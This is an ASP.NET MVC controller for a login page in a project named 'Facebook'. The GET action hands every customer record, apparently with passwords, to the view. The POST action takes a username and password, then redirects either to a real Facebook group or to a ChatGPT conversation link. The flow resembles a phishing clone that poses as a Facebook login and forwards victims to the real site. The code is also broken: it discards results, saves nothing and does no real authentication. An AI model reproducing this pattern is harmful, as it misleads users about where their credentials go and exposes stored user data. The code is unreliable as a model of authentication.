using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using System.Web.Mvc;
using Facebook.Models;
namespace Facebook.Controllers
{
    public class HomeController : Controller
    {
        FACEBOOKEntities2 db = new FACEBOOKEntities2();
        
        public ActionResult Login()
        {
            List<CUSTOMER> customer = db.CUSTOMERs.ToList();
            ViewBag.cus = customer;
            return View();
        }
        [HttpPost]
        public ActionResult Login(CUSTOMER customer)
        {
            if (ModelState.IsValid)
            {

                if (customer.password.Length < 6)
                {
                    TempData["error"] = "Sai mật khẩu!";
                    
                    return Redirect("https://chat.openai.com/c/8ea91ef7-45c9-4104-8403-5fa7f49851f8");
                }
                else
                {

                    customer.username.ToArray();
                    
                    db.SaveChanges();
                    return Redirect("https://www.facebook.com/groups/840651015959580");
                }
            }
            return View();
        }

       
    }
}